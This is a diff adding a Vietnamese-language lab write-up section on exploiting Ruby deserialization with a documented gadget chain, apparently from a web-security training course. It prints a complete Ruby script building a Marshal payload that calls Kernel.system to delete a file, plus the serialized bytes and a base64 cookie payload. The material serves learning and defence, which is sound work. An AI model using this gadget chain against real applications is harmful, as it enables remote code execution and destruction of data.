@@ -127,6 +127,63 @@ Ta thu được:
 Thay thế đoạn mã trên với session cookie hiện tại, sau khi refresh kết quả thành công.
 
 # 7. Exploiting Ruby deserialization using a documented gadget chain
+Website sử dụng serialized session cookie với ngôn ngữ Ruby. Ta sẽ tìm một Deserialisation gadget chain để exploit. Sau khi research, nhận thấy đoạn code sau đây có thể tạo ra một chuỗi gadget chain để thực thi RCE:
+
+```
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts payload.inspect
+puts Marshal.load(payload)
+```
+
+Sau khi chạy code, ta thu được chuỗi:
+
+```
+\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI\"\baaa\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r@git_setI\"\x1Frm /home/carlos/morale.txt\x06;\fT;\x12:\fresolve
+```
+
+Thực hiện base64, ta thu được:
+
+```
+BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ
+```
+
+Thay thế payload với session cookie hiện tại, kết quả code được thực thi thành công, bài lab được giải.
 
 # 8. Developing a custom gadget chain for Java deserialization
 
